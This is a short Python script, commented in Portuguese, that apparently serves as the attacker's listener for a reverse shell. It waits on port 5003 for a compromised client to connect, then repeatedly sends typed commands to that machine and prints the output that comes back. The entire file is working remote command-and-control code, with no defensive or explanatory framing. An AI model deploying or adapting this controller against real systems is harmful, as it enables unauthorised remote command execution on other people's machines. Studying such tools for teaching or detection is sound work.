import socket


SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5003
BUFFER_SIZE = 1024 # Envia 1024 bytes (1 kb) por vez

s = socket.socket()

# Escutar
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Escutando em {SERVER_HOST}:{SERVER_PORT} ...")

# Receber conexão
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
message = "Hello and Welcome".encode()
client_socket.send(message)

while True:
    command = input("Digite o comando que deseja executar:")
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    # Recebe o resultado do comando
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)
# Fecha a conexão com o client
client_socket.close()
# Fecha a conexão do server
s.close()
